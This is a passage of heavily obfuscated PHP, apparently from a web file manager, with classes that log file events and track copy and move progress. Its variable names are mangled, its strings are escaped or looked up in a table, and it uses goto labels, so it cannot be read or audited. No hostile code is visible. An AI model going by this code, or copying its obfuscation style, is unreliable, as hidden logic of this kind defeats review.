[555])->listData($š§‹úÛ[$¢èĞŞ [2085]]); if (!$¢Ûä×Í¬) { return !1; $ ®“Á± = Model($¢èĞŞ [555])->listData(); $À‡º¸û² = array_filter_by_field($ ®“Á±, $¢èĞŞ [471], $¢èĞŞ [228]); return $À‡º¸û²; } $«¥»ªâ® = array_field_key($¢Ûä×Í¬, array($¢èĞŞ [459], $¢èĞŞ [32], $¢èĞŞ [471], $¢èĞŞ [2000], $¢èĞŞ [2001])); $«¥»ªâ®[$¢èĞŞ [2201]] = $š§‹úÛ; return $«¥»ªâ®; } else { return array($¢èĞŞ [477] => 0, $¢èĞŞ [1983] => $š§‹úÛ[$¢èĞŞ [2145]], $¢èĞŞ [478] => $¢èĞŞ [12], $¢èĞŞ [2000] => $¢èĞŞ [2202]); } } } class SourceEventModel extends ModelBase { protected $tableName = "\151\157\x5f\x73\157\165\x72\143\145\137\145\166\x65\156\164"; protected $dataAuto = array(array("\x63\162\145\141\x74\x65\x54\x69\x6d\145", "\164\151\x6d\145", "\151\156\x73\x65\x72\164", "\146\165\x6e\x63\164\151\157\x6e"), array("\144\145\163\143", '', "\x69\156\x73\x65\x72\x74\x2c\165\160\x64\x61\164\x65\54\163\x65\x6c\145\143\x74", "\x6a\x73\157\156")); protected $eventSave = true; public function recodeStop() { $this->eventSave = !1; } public function recodeStart() { $this->eventSave = !0; } public function addEvent($ªšƒú ï, $Ó·¹ÎÆ, $²ñ¥ƒ•Ï = '') { $ÄƒÓÈå =& $_SERVER[÷åé¼î]; if (!$this->eventSave) { return; } $ÈÃ‚‡éó = Model($ÄƒÓÈå[1414])->sourceInfo($ªšƒú ï); if (!$ÈÃ‚‡éó) { return !1; } if ($this->isDisableEvent($ÈÃ‚‡éó, $Ó·¹ÎÆ)) { return; } if ($²ñ¥ƒ•Ï && is_string($²ñ¥ƒ•Ï)) { $²ñ¥ƒ•Ï = array($ÄƒÓÈå[2016] => $²ñ¥ƒ•Ï); } $¶ùÜ¸• = defined($ÄƒÓÈå[2203]) ? USER_ID : 0; $ä´¤ï­÷ = array($ÄƒÓÈå[475] => $ªšƒú ï, $ÄƒÓÈå[2204] => $ÈÃ‚‡éó[$ÄƒÓÈå[192]], $ÄƒÓÈå[2205] => $ÈÃ‚‡éó[$ÄƒÓÈå[32]], $ÄƒÓÈå[566] => !empty($ÈÃ‚‡éó[$ÄƒÓÈå[566]]) ? $ÈÃ‚‡éó[$ÄƒÓÈå[566]] : $ÄƒÓÈå[12], $ÄƒÓÈå[1770] => $¶ùÜ¸•, $ÄƒÓÈå[480] => $Ó·¹ÎÆ, $ÄƒÓÈå[1772] => $²ñ¥ƒ•Ï); $this->addSystemLog($Ó·¹ÎÆ, $ä´¤ï­÷); unset($ä´¤ï­÷[$ÄƒÓÈå[2205]], $ä´¤ï­÷[$ÄƒÓÈå[566]]); return $this->add($ä´¤ï­÷); } private function addSystemLog($“×¼®‚İ, $¿²ê‹¥÷) { $¾™áç©´ =& $_SERVER[÷åé¼î]; if ($“×¼®‚İ == $¾™áç©´[2206]) { $“×¼®‚İ = $¿²ê‹¥÷[$¾™áç©´[510]][$¾™áç©´[2207]]; } else { if (in_array($“×¼®‚İ, array($¾™áç©´[1957], $¾™áç©´[2208]))) { $“×¼®‚İ = $¿²ê‹¥÷[$¾™áç©´[510]][$¾™áç©´[171]]; } } $—Üâ´ïæ = array_merge($¿²ê‹¥÷, array($¾™áç©´[2209] => $¿²ê‹¥÷[$¾™áç©´[193]], $¾™áç©´[2210] => $¿²ê‹¥÷[$¾™áç©´[2210]])); Hook::trigger($¾™áç©´[2211], $¾™áç©´[2212] . $“×¼®‚İ, $¿²ê‹¥÷); Model($¾™áç©´[1921])->addLog($¾™áç©´[2212] . $“×¼®‚İ, $—Üâ´ïæ); } private function isDisableEvent($Œ˜ä÷áë, $°ŸøÌã) { $˜ëı“Ş =& $_SERVER[÷åé¼î]; if ($Œ˜ä÷áë[$˜ëı“Ş[190]] != SourceModel::TYPE_SYSTEM) { return !1; } if ($°ŸøÌã == $˜ëı“Ş[1946]) { return !1; } return !0; } public function eventCreate($ïÖœ·‡‹, $Ì‰¹êĞÍ) { $µªëËòØ =& $_SERVER[÷åé¼î]; $äØÓ¥ñÛ = Model($µªëËòØ[1414])->sourceInfo($ïÖœ·‡‹); $†İ¹ç¿Â = array($µªëËòØ[2207] => $Ì‰¹êĞÍ, $µªëËòØ[32] => $äØÓ¥ñÛ[$µªëËòØ[32]]); return $this->addEvent($ïÖœ·‡‹, $µªëËòØ[2206], $†İ¹ç¿Â); } public function eventFileEdit($ ò½äª) { $¥²ŠßšÏ =& $_SERVER[÷åé¼î]; $’Ø…ƒˆÇ = array($¥²ŠßšÏ[2213] => $_SERVER[$¥²ŠßšÏ[2214]], $¥²ŠßšÏ[2215] => strtolower(ACTION)); if (isset($GLOBALS[$¥²ŠßšÏ[7]][$¥²ŠßšÏ[2216]])) { $’Ø…ƒˆÇ[$¥²ŠßšÏ[2216]] = $¥²ŠßšÏ[91]; } return $this->addEvent($ ò½äª, $¥²ŠßšÏ[1947], $’Ø…ƒˆÇ); } public function eventRecycle($€˜²é¼½, $³ø¼šÁÙ) { return $this->addEvent($€˜²é¼½, $_SERVER[÷åé¼î][2208], $³ø¼šÁÙ); } private static $_removeLast = ''; public function eventRemove($‹€øşº) { $Ä¹Ú¶ç¾ =& $_SERVER[÷åé¼î]; self::$_removeLast = $‹€øşº; $…¬€ş‡ = Model($Ä¹Ú¶ç¾[1414])->sourceInfo($‹€øşº); $²’Ê³Ùµ = array_field_key($…¬€ş‡, array($Ä¹Ú¶ç¾[193], $Ä¹Ú¶ç¾[525], $Ä¹Ú¶ç¾[489], $Ä¹Ú¶ç¾[568])); $´–İ¯¬Ò = array($Ä¹Ú¶ç¾[171] => $…¬€ş‡[$Ä¹Ú¶ç¾[32]], $Ä¹Ú¶ç¾[2215] => ACTION, $Ä¹Ú¶ç¾[2217] => $²’Ê³Ùµ); return $this->addEvent($…¬€ş‡[$Ä¹Ú¶ç¾[192]], $Ä¹Ú¶ç¾[1946], $´–İ¯¬Ò); } public function eventShare($Åò”­‚Ñ, $’µ½ôÀÊ) { return $this->addEvent($Åò”­‚Ñ, $_SERVER[÷åé¼î][1957], $’µ½ôÀÊ); } public function eventMove($Ë˜„ãƒ, $ğ¢£Àï², $Òµà†®à) { $ÄÎı—¨Ş =& $_SERVER[÷åé¼î]; if (self::$_removeLast == $Ë˜„ãƒ) { return; } $£ùôí“Ô = Model($ÄÎı—¨Ş[1414]); $‘®×È«È = $£ùôí“Ô->sourceInfo($Ë˜„ãƒ); $ä¿ä’°± = $£ùôí“Ô->sourceInfo($ğ¢£Àï²); $áèÈì¤Ê = $£ùôí“Ô->sourceInfo($Òµà†®à); $üâùğÈä = array($ÄÎı—¨Ş[1235] => $ğ¢£Àï², $ÄÎı—¨Ş[2218] => $ä¿ä’°±[$ÄÎı—¨Ş[32]], $ÄÎı—¨Ş[2194] => !empty($ä¿ä’°±[$ÄÎı—¨Ş[566]]) ? $ä¿ä’°±[$ÄÎı—¨Ş[566]] : $ÄÎı—¨Ş[12], $ÄÎı—¨Ş[1236] => $Òµà†®à, $ÄÎı—¨Ş[2219] => $áèÈì¤Ê[$ÄÎı—¨Ş[32]], $ÄÎı—¨Ş[2220] => !empty($áèÈì¤Ê[$ÄÎı—¨Ş[566]]) ? $áèÈì¤Ê[$ÄÎı—¨Ş[566]] : $ÄÎı—¨Ş[12]); $this->addEvent($Ë˜„ãƒ, $ÄÎı—¨Ş[604], $üâùğÈä); $‘®×È«È = $£ùôí“Ô->sourceInfo($Ë˜„ãƒ); $üâùğÈä = array($ÄÎı—¨Ş[193] => $‘®×È«È[$ÄÎı—¨Ş[193]], $ÄÎı—¨Ş[32] => $‘®×È«È[$ÄÎı—¨Ş[32]]); $this->addEvent($ğ¢£Àï², $ÄÎı—¨Ş[2221], $üâùğÈä); } public function eventCopy($ë¢ÂÕÉü) { $this->eventCreate($ë¢ÂÕÉü, $_SERVER[÷åé¼î][602]); } public function eventRename($’Èœâè, $ÈÏöÂ¹, $ ÚÇÙ½) { $¬ÙĞÅÆİ =& $_SERVER[÷åé¼î]; $’Ş ‡ş = array($¬ÙĞÅÆİ[1235] => $ÈÏöÂ¹, $¬ÙĞÅÆİ[1236] => $ ÚÇÙ½); return $this->addEvent($’Èœâè, $¬ÙĞÅÆİ[1428], $’Ş ‡ş); } public function eventAddComment($È‰ß¹ÀÇ, $É–Ê¢ò) { return $this->addEvent($È‰ß¹ÀÇ, $_SERVER[÷åé¼î][2222], $É–Ê¢ò); } public function eventAddDesc($„¹¥Üá, $Ë¬ù»¬) { return $this->addEvent($„¹¥Üá, $_SERVER[÷åé¼î][2223], $Ë¬ù»¬); } public function listBySource($ŠƒŒäà›) { $‡÷ÒÈ™Ğ =& $_SERVER[÷åé¼î]; $ÔÜÆ³ã  = Model($‡÷ÒÈ™Ğ[1414])->sourceInfo($ŠƒŒäà›); $œÆ•…‰ = array($‡÷ÒÈ™Ğ[475] => $ŠƒŒäà›); if ($ÔÜÆ³ã [$‡÷ÒÈ™Ğ[469]] == $‡÷ÒÈ™Ğ[91]) { $ó×Œæ’ê = Model($‡÷ÒÈ™Ğ[1414])->listSearchChildren($ŠƒŒäà›, 20000); $ó×Œæ’ê[] = $ŠƒŒäà› . $‡÷ÒÈ™Ğ[438]; $œÆ•…‰ = array($‡÷ÒÈ™Ğ[193] => array($‡÷ÒÈ™Ğ[7], $ó×Œæ’ê)); } $ÁÁ·ÈÂ¥ = $this->where($œÆ•…‰)->order($‡÷ÒÈ™Ğ[2224])->selectPage(); if ($ÁÁ·ÈÂ¥[$‡÷ÒÈ™Ğ[426]][$‡÷ÒÈ™Ğ[427]] == 0) { $ÁÁ·ÈÂ¥[$‡÷ÒÈ™Ğ[426]][$‡÷ÒÈ™Ğ[427]] = 1; $ÁÁ·ÈÂ¥[$‡÷ÒÈ™Ğ[429]] = array(array($‡÷ÒÈ™Ğ[475] => $ŠƒŒäà›, $‡÷ÒÈ™Ğ[2204] => $ÔÜÆ³ã [$‡÷ÒÈ™Ğ[192]], $‡÷ÒÈ™Ğ[1770] => $ÔÜÆ³ã [$‡÷ÒÈ™Ğ[511]], $‡÷ÒÈ™Ğ[480] => $‡÷ÒÈ™Ğ[2225], $‡÷ÒÈ™Ğ[481] => $ÔÜÆ³ã [$‡÷ÒÈ™Ğ[231]], $‡÷ÒÈ™Ğ[1772] => $‡÷ÒÈ™Ğ[12])); } return $this->eventListParse($ÁÁ·ÈÂ¥, $ŠƒŒäà›); } private function eventListParse($¤µ§ıªú, $ëÛÑÄ€Ó) { $´†ÙÎÛ’ =& $_SERVER[÷åé¼î]; $ÓÕœ§¼ñ = $¤µ§ıªú[$´†ÙÎÛ’[429]]; $ÛŞë°â† = array_to_keyvalue($ÓÕœ§¼ñ, $´†ÙÎÛ’[12], $´†ÙÎÛ’[193]); $ş¥–ïÑ¿ = array_to_keyvalue($ÓÕœ§¼ñ, $´†ÙÎÛ’[12], $´†ÙÎÛ’[2210]); foreach ($ÓÕœ§¼ñ as $ä÷Ì ’å) { $‘å­ú˜ã = $ä÷Ì ’å[$´†ÙÎÛ’[510]]; if ($ä÷Ì ’å[$´†ÙÎÛ’[33]] == $´†ÙÎÛ’[604] && isset($‘å­ú˜ã[$´†ÙÎÛ’[1235]])) { $ÛŞë°â†[] = $‘å­ú˜ã[$´†ÙÎÛ’[1235]] . $´†ÙÎÛ’[12]; $ÛŞë°â†[] = $‘å­ú˜ã[$´†ÙÎÛ’[1236]] . $´†ÙÎÛ’[12]; } if ($ä÷Ì ’å[$´†ÙÎÛ’[33]] == $´†ÙÎÛ’[2221] && isset($‘å­ú˜ã[$´†ÙÎÛ’[193]])) { $ÛŞë°â†[] = $‘å­ú˜ã[$´†ÙÎÛ’[193]] . $´†ÙÎÛ’[12]; } } $ÛŞë°â† = array_merge($ÛŞë°â†, $ş¥–ïÑ¿, array($ëÛÑÄ€Ó . $´†ÙÎÛ’[12])); $ÛŞë°â† = array_unique($ÛŞë°â†); $éÛ’©Œ« = array_unique(array_to_keyvalue($ÓÕœ§¼ñ, $´†ÙÎÛ’[12], $´†ÙÎÛ’[1779])); $Ô¿¿ÍÆ = Model($´†ÙÎÛ’[582])->userListInfo($éÛ’©Œ«); $ˆœ¬ËÏª = Model($´†ÙÎÛ’[889])->sourceListInfo($ÛŞë°â†, !0); foreach ($ÓÕœ§¼ñ as &$ä÷Ì ’å) { if ($ä÷Ì ’å[$´†ÙÎÛ’[33]] == $´†ÙÎÛ’[604] && isset($ä÷Ì ’å[$´†ÙÎÛ’[510]][$´†ÙÎÛ’[1235]])) { $ä÷Ì ’å[$´†ÙÎÛ’[510]][$´†ÙÎÛ’[1235]] = $ˆœ¬ËÏª[$ä÷Ì ’å[$´†ÙÎÛ’[510]][$´†ÙÎÛ’[1235]]]; $ä÷Ì ’å[$´†ÙÎÛ’[510]][$´†ÙÎÛ’[1236]] = $ˆœ¬ËÏª[$ä÷Ì ’å[$´†ÙÎÛ’[510]][$´†ÙÎÛ’[1236]]]; } if ($ä÷Ì ’å[$´†ÙÎÛ’[33]] == $´†ÙÎÛ’[2221] && isset($ä÷Ì ’å[$´†ÙÎÛ’[510]][$´†ÙÎÛ’[193]])) { $ä÷Ì ’å[$´†ÙÎÛ’[510]][$´†ÙÎÛ’[193]] = $ˆœ¬ËÏª[$ä÷Ì ’å[$´†ÙÎÛ’[510]][$´†ÙÎÛ’[193]]]; } $ä÷Ì ’å[$´†ÙÎÛ’[90]] = $ˆœ¬ËÏª[$ä÷Ì ’å[$´†ÙÎÛ’[193]]]; $ä÷Ì ’å[$´†ÙÎÛ’[2226]] = $ˆœ¬ËÏª[$ä÷Ì ’å[$´†ÙÎÛ’[2210]]]; if ($ä÷Ì ’å[$´†ÙÎÛ’[33]] == $´†ÙÎÛ’[1946]) { $ä÷Ì ’å[$´†ÙÎÛ’[2226]] = $ä÷Ì ’å[$´†ÙÎÛ’[90]]; $ä÷Ì ’å[$´†ÙÎÛ’[2210]] = $ä÷Ì ’å[$´†ÙÎÛ’[2226]][$´†ÙÎÛ’[193]]; $ä÷Ì ’å[$´†ÙÎÛ’[90]] = !1; $ä÷Ì ’å[$´†ÙÎÛ’[193]] = $´†ÙÎÛ’[12]; } $ä÷Ì ’å[$´†ÙÎÛ’[2153]] = $Ô¿¿ÍÆ[$ä÷Ì ’å[$´†ÙÎÛ’[1779]]]; } unset($ä÷Ì ’å); $¤µ§ıªú[$´†ÙÎÛ’[429]] = $ÓÕœ§¼ñ; return $¤µ§ıªú; } public function removeBySource($¹ú‰ïº°) { $Şî©Ê·ó = array($_SERVER[÷åé¼î][475] => $¹ú‰ïº°); $this->where($Şî©Ê·ó)->remove(); } } goto C­Ö•İğ¡×; EŸ…ê‡ë„: class TaskFileTransfer extends Task { protected function startAfter() { $Ô‰ì˜÷ =& $_SERVER[÷åé¼î]; $÷¸ƒÉâŞ =& $this->task; $this->sourceCopyFolder = !1; Hook::bind($Ô‰ì˜÷[1809], array($this, $Ô‰ì˜÷[1810])); Hook::bind($Ô‰ì˜÷[1302], array($this, $Ô‰ì˜÷[1811])); Hook::bind($Ô‰ì˜÷[1812], array($this, $Ô‰ì˜÷[1813])); Hook::bind($Ô‰ì˜÷[652], array($this, $Ô‰ì˜÷[1814])); Hook::bind($Ô‰ì˜÷[653], array($this, $Ô‰ì˜÷[1815])); Hook::bind($Ô‰ì˜÷[659], array($this, $Ô‰ì˜÷[1816])); Hook::bind($Ô‰ì˜÷[660], array($this, $Ô‰ì˜÷[1817])); Hook::bind($Ô‰ì˜÷[655], array($this, $Ô‰ì˜÷[1818])); Hook::bind($Ô‰ì˜÷[657], array($this, $Ô‰ì˜÷[1819])); Hook::bind($Ô‰ì˜÷[621], array($this, $Ô‰ì˜÷[1820])); Hook::bind($Ô‰ì˜÷[618], array($this, $Ô‰ì˜÷[1820])); Hook::bind($Ô‰ì˜÷[623], array($this, $Ô‰ì˜÷[1820])); Hook::bind($Ô‰ì˜÷[625], array($this, $Ô‰ì˜÷[1820])); Hook::bind($Ô‰ì˜÷[627], array($this, $Ô‰ì˜÷[1820])); Hook::bind($Ô‰ì˜÷[1821], array($this, $Ô‰ì˜÷[1822])); Hook::bind($Ô‰ì˜÷[643], array($this, $Ô‰ì˜÷[1823])); $this->sourceModelCopyFlag = !1; Hook::bind($Ô‰ì˜÷[1824], array($this, $Ô‰ì˜÷[1825])); Hook::bind($Ô‰ì˜÷[1826], array($this, $Ô‰ì˜÷[1827])); Hook::bind($Ô‰ì˜÷[1828], array($this, $Ô‰ì˜÷[1829])); $÷¸ƒÉâŞ[$Ô‰ì˜÷[1830]] = LNG($Ô‰ì˜÷[1831]); $÷¸ƒÉâŞ[$Ô‰ì˜÷[1832]] = 0; $÷¸ƒÉâŞ[$Ô‰ì˜÷[1833]] = 0; $÷¸ƒÉâŞ[$Ô‰ì˜÷[1137]] = $Ô‰ì˜÷[12]; $÷¸ƒÉâŞ[$Ô‰ì˜÷[1834]] = $Ô‰ì˜÷[12]; $÷¸ƒÉâŞ[$Ô‰ì˜÷[1835]] = 0; $÷¸ƒÉâŞ[$Ô‰ì˜÷[1836]] = 0; $÷¸ƒÉâŞ[$Ô‰ì˜÷[1837]] = 0; if (!$÷¸ƒÉâŞ[$Ô‰ì˜÷[1668]]) { $÷¸ƒÉâŞ[$Ô‰ì˜÷[1668]] = LNG($Ô‰ì˜÷[1838]); } } protected function endAfter() { $†µæÕ =& $_SERVER[÷åé¼î]; Hook::unbind($†µæÕ[1809], array($this, $†µæÕ[1810])); Hook::unbind($†µæÕ[1302], array($this, $†µæÕ[1811])); Hook::unbind($†µæÕ[1812], array($this, $†µæÕ[1813])); Hook::unbind($†µæÕ[652], array($this, $†µæÕ[1814])); Hook::unbind($†µæÕ[653], array($this, $†µæÕ[1815])); Hook::unbind($†µæÕ[659], array($this, $†µæÕ[1816])); Hook::unbind($†µæÕ[660], array($this, $†µæÕ[1817])); Hook::unbind($†µæÕ[655], array($this, $†µæÕ[1818])); Hook::unbind($†µæÕ[657], array($this, $†µæÕ[1819])); Hook::unbind($†µæÕ[621], array($this, $†µæÕ[1820])); Hook::unbind($†µæÕ[618], array($this, $†µæÕ[1820])); Hook::unbind($†µæÕ[623], array($this, $†µæÕ[1820])); Hook::unbind($†µæÕ[625], array($this, $†µæÕ[1820])); Hook::unbind($†µæÕ[627], array($this, $†µæÕ[1820])); Hook::unbind($†µæÕ[1821], array($this, $†µæÕ[1822])); Hook::unbind($†µæÕ[643], array($this, $†µæÕ[1823])); Hook::unbind($†µæÕ[1824], array($this, $†µæÕ[1825])); Hook::unbind($†µæÕ[1826], array($this, $†µæÕ[1827])); Hook::unbind($†µæÕ[1828], array($this, $†µæÕ[1829])); } public function copyMoveStart($¾Œ°œØ“, $ÉÒÈ¼×´, $äï©œ©‘, $öÒ¶ûáÉ) { $‹Ú™Ÿõ =& $_SERVER[÷åé¼î]; self::log($‹Ú™Ÿõ[1839] . $ÉÒÈ¼×´ . $‹Ú™Ÿõ[73] . $öÒ¶ûáÉ); $Ú¤¾¾úã = rtrim(TEMP_FILES, $‹Ú™Ÿõ[8]); if (substr($ÉÒÈ¼×´, 0, strlen($Ú¤¾¾úã)) == $Ú¤¾¾úã) { return; } if (substr($öÒ¶ûáÉ, 0, strlen($Ú¤¾¾úã)) == $Ú¤¾¾úã) { return; } $æúÈ²œ’ =& $this->task; $æúÈ²œ’[$‹Ú™Ÿõ[1840]] = KodIO::transferType($¾Œ°œØ“, $äï©œ©‘); $this->update(); } public function updateAfter() { $¸Œ±º’ =& $_SERVER[÷åé¼î]; $´Ù„ªæ£ =& $this->task; if (!$´Ù„ªæ£[$¸Œ±º’[828]]) { return; } if ($this->sourceModelCopyFlag) { return; } if ($´Ù„ªæ£[$¸Œ±º’[1840]] == $¸Œ±º’[1395]) { return; } self::updateTask($´Ù„ªæ£); } private static function updateTask(&$ÆŒÀˆ›ğ) { $Á¢şÄÆ¼ =& $_SERVER[÷åé¼î]; if ($ÆŒÀˆ›ğ[$Á¢şÄÆ¼[1840]] == $Á¢şÄÆ¼[1273] || $ÆŒÀˆ›ğ[$Á¢şÄÆ¼[1840]] == $Á¢şÄÆ¼[110]) { if ($ÆŒÀˆ›ğ[$Á¢şÄÆ¼[1834]]) { $ÆŒÀˆ›ğ[$Á¢şÄÆ¼[1837]] = $ÆŒÀˆ›ğ[$Á¢şÄÆ¼[1836]] + $ÆŒÀˆ›ğ[$Á¢şÄÆ¼[1833]]; } } else { if ($ÆŒÀˆ›ğ[$Á¢şÄÆ¼[1840]] == $Á¢şÄÆ¼[1396]) { if ($ÆŒÀˆ›ğ[$Á¢şÄÆ¼[1834]] == $Á¢şÄÆ¼[1273]) { $ÆŒÀˆ›ğ[$Á¢şÄÆ¼[1837]] = $ÆŒÀˆ›ğ[$Á¢şÄÆ¼[1836]] + $ÆŒÀˆ›ğ[$Á¢şÄÆ¼[1833]] * 0.5; } else { if ($ÆŒÀˆ›ğ[$Á¢şÄÆ¼[1834]] == $Á¢şÄÆ¼[110]) { $ÆŒÀˆ›ğ[$Á¢şÄÆ¼[1837]] = $ÆŒÀˆ›ğ[$Á¢şÄÆ¼[1836]] + $ÆŒÀˆ›ğ[$Á¢şÄÆ¼[1832]] * 0.5 + $ÆŒÀˆ›ğ[$Á¢şÄÆ¼[1833]] * 0.5; } } } } $ÆŒÀˆ›ğ[$Á¢şÄÆ¼[1781]] = $ÆŒÀˆ›ğ[$Á¢şÄÆ¼[1837]] / $ÆŒÀˆ›ğ[$Á¢şÄÆ¼[828]]; if ($ÆŒÀˆ›ğ[$Á¢şÄÆ¼[1781]] > 0) { $î³á˜ÖÑ = timeFloat() - $ÆŒÀˆ›ğ[$Á¢şÄÆ¼[1783]] - $ÆŒÀˆ›ğ[$Á¢şÄÆ¼[1786]]; $ÆŒÀˆ›ğ[$Á¢şÄÆ¼[1787]] = $î³á˜ÖÑ * (1 - $ÆŒÀˆ›ğ[$Á¢şÄÆ¼[1781]]) / $ÆŒÀˆ›ğ[$Á¢şÄÆ¼[1781]]; } } public function addPath($ø¼Æ¾§ƒ) { $•ÈçëÆö =& $_SERVER[÷åé¼î]; if (!$ø¼Æ¾§ƒ) { return; } $ÅôÍáÍ¹ =& $this->task; $Ü¾ööşú = IO::infoWithChildren($ø¼Æ¾§ƒ); $¦¹¾‘¿“ = $ÅôÍáÍ¹[$•ÈçëÆö[1841]] ? $ÅôÍáÍ¹[$•ÈçëÆö[1841]][$•ÈçëÆö[1842]] : 0; $ÅôÍáÍ¹[$•ÈçëÆö[1841]] = array($•ÈçëÆö[1842] => $¦¹¾‘¿“ + 1, $•ÈçëÆö[478] => $Ü¾ööşú[$•ÈçëÆö[32]], $•ÈçëÆö[87] => $Ü¾ööşú[$•ÈçëÆö[87]], $•ÈçëÆö[566] => $Ü¾ööşú[$•ÈçëÆö[566]] ? $Ü¾ööşú[$•ÈçëÆö[566]] : $Ü¾ööşú[$•ÈçëÆö[87]]); if ($Ü¾ööşú[$•ÈçëÆö[33]] == $•ÈçëÆö[230]) { $ÅôÍáÍ¹[$•ÈçëÆö[1135]] += 1; } else { $ÅôÍáÍ¹[$•ÈçëÆö[1135]] += $Ü¾ööşú[$•ÈçëÆö[82]][$•ÈçëÆö[80]]; if ($Ü¾ööşú[$•ÈçëÆö[193]]) { $ÅôÍáÍ¹[$•ÈçëÆö[1135]] += $Ü¾ööşú[$•ÈçëÆö[82]][$•ÈçëÆö[81]] + 1; } } $ÅôÍáÍ¹[$•ÈçëÆö[828]] += $Ü¾ööşú[$•ÈçëÆö[79]]; $this->update(); } public function sourceCopyFolderStart() { $this->sourceCopyFolder = !0; } public function sourceCopyFolderEnd() { $this->sourceCopyFolder = !1; } public function sourceAddHashStart($ï±ÒãÈ) { } public function sourceAddHashEnd($¢¾Ñ¡†§) { } public function sourceAddFileStart($•øÂ„ïâ) { $©›¢âÒÊ =& $_SERVER[÷åé¼î]; $ù¥»İö­ =& $this->task; $ù¥»İö­[$©›¢âÒÊ[1832]] = $•øÂ„ïâ[$©›¢âÒÊ[79]]; $ù¥»İö­[$©›¢âÒÊ[1830]] = $•øÂ„ïâ[$©›¢âÒÊ[32]]; $ù¥»İö­[$©›¢âÒÊ[1137]] = $•øÂ„ïâ[$©›¢âÒÊ[32]]; $ù¥»İö­[$©›¢âÒÊ[1843]] = $•øÂ„ïâ[$©›¢âÒÊ[87]]; $this->update(); } public function sourceAddFileEnd($ŸóÑ˜’Ü) { $Î†Àı’ =& $_SERVER[÷åé¼î]; $˜¤šÓ–¢ =& $this->task; $˜¤šÓ–¢[$Î†Àı’[1837]] += $ŸóÑ˜’Ü[$Î†Àı’[79]]; $˜¤šÓ–¢[$Î†Àı’[1843]] = $ŸóÑ˜’Ü[$Î†Àı’[87]]; $this->update(1); } public function copyFileStart($ÛÍ¬Ú“¾, $«ù­Íï, $ûšíÚ†”, $ÅÎ€—ç¶, $áŸÀó», $™º¥Ëƒ) { $ÄÖ§ÚÌ« =& $_SERVER[÷åé¼î]; $áİ»ÃŞ– = $áŸÀó»; if ($áİ»ÃŞ– == $GLOBALS[$ÄÖ§ÚÌ«[1844]]) { $áİ»ÃŞ– = $GLOBALS[$ÄÖ§ÚÌ«[1845]]; } $GLOBALS[$ÄÖ§ÚÌ«[1845]] = $áŸÀó»; $GLOBALS[$ÄÖ§ÚÌ«[1844]] = $™º¥Ëƒ; $Š¯ÅÓ« =& $this->task; $Š¯ÅÓ«[$ÄÖ§ÚÌ«[1830]] = $áİ»ÃŞ–; $Š¯ÅÓ«[$ÄÖ§ÚÌ«[1832]] = (int) $ÛÍ¬Ú“¾->size($«ù­Íï); $Š¯ÅÓ«[$ÄÖ§ÚÌ«[1833]] = 0; $Š¯ÅÓ«[$ÄÖ§ÚÌ«[1137]] = $ÄÖ§ÚÌ«[12]; $Š¯ÅÓ«[$ÄÖ§ÚÌ«[1834]] = $ÄÖ§ÚÌ«[12]; $Š¯ÅÓ«[$ÄÖ§ÚÌ«[1835]] = 0; $°ıœÚò = $Š¯ÅÓ«[$ÄÖ§ÚÌ«[1832]] > 1024 * 1024 * 10 ? !0 : !1; Cache::remove($Š¯ÅÓ«[$ÄÖ§ÚÌ«[459]] . $ÄÖ§ÚÌ«[1846]); if ($°ıœÚò && file_exists(get_path_father($ÅÎ€—ç¶))) { Cache::set($Š¯ÅÓ«[$ÄÖ§ÚÌ«[459]] . $ÄÖ§ÚÌ«[1846], $ÅÎ€—ç¶); $Š¯ÅÓ«[$ÄÖ§ÚÌ«[1803]] = array($ÄÖ§ÚÌ«[1847], $ÄÖ§ÚÌ«[1848]); } $this->update(0, $°ıœÚò); } public static function updateCopyLocalFileSize($Äï–œ¹ö) { $ß¤Œâö— =& $_SERVER[÷åé¼î]; $÷ÉéÖ± = Cache::get($Äï–œ¹ö[$ß¤Œâö—[459]] . $ß¤Œâö—[1846]); if (!$÷ÉéÖ± || !file_exists($÷ÉéÖ±)) { return $Äï–œ¹ö; } $Äï–œ¹ö[$ß¤Œâö—[1833]] = @filesize($÷ÉéÖ±); $Äï–œ¹ö[$ß¤Œâö—[1837]] += $Äï–œ¹ö[$ß¤Œâö—[1833]]; self::updateTask($Äï–œ¹ö); return $Äï–œ¹ö; } public function copyFileEnd($Ï¨„Ù˜Ç, $¥›†•Â¶, $¤Â§â›Î, $Ô·™ëÓ, $Ò…äÚ, $œ•œ¥£Ğ) { $ó¢†Ñâè =& $_SERVER[÷åé¼î]; $ì¬Ä‹× =& $this->task; $ì¬Ä‹×[$ó¢†Ñâè[1833]] = $ì¬Ä‹×[$ó¢†Ñâè[1832]]; $ì¬Ä‹×[$ó¢†Ñâè[1834]] = $ó¢†Ñâè[12]; unset($ì¬Ä‹×[$ó¢†Ñâè[1803]]); if ($Ò…äÚ == $ì¬Ä‹×[$ó¢†Ñâè[1830]]) { $ì¬Ä‹×[$ó¢†Ñâè[1836]] += $ì¬Ä‹×[$ó¢†Ñâè[1832]]; $ì¬Ä‹×[$ó¢†Ñâè[1837]] = $ì¬Ä‹×[$ó¢†Ñâè[1836]]; $Ã³Ö³—‡ = 1; if (isset($ì¬Ä‹×[$ó¢†Ñâè[1843]]) && $ì¬Ä‹×[$ó¢†Ñâè[1843]] == $¥›†•Â¶) { $Ã³Ö³—‡ = 0; } $this->update($Ã³Ö³—‡); } else { $this->update(); $ì¬Ä‹×[$ó¢†Ñâè[1833]] = 0; } Cache::remove($ì¬Ä‹×[$ó¢†Ñâè[459]] . $ó¢†Ñâè[1846]); self::log($ó¢†Ñâè[1849] . $¥›†•Â¶ . $ó¢†Ñâè[73] . $Ô·™ëÓ . $ó¢†Ñâè[262] . $Ò…äÚ . $ó¢†Ñâè[1850] . $ì¬Ä‹×[$ó¢†Ñâè[1830]]); } public function updateFileEnd($ğ•¼Ïü€, $ÏÛıÜ¼¤) { $Ù·©…‚ =& $_SERVER[÷åé¼î]; $•Åş›“ğ =& $this->task; $•Åş›“ğ[$Ù·©…‚[1830]] = $ğ•¼Ïü€; $•Åş›“ğ[$Ù·©…‚[1832]] = $ÏÛıÜ¼¤; $•Åş›“ğ[$Ù·©…‚[1836]] += $ÏÛıÜ¼¤; $•Åş›“ğ[$Ù·©…‚[1837]] = $•Åş›“ğ[$Ù·©…‚[1836]]; $this->update(1); self::log($Ù·©…‚[1851] . $ğ•¼Ïü€); } public function sourceModelCopy($ˆï†ıÎ½) { $ı»úŞë³ =& $_SERVER[÷åé¼î]; $©ßœ²º = $ˆï†ıÎ½[0]; $õóë™ × = $ˆï†ıÎ½[1]; $£¿”î¶” =& $this->task; $this->sourceModelCopyFlag = !0; $™‚°»õÆ = 0; switch 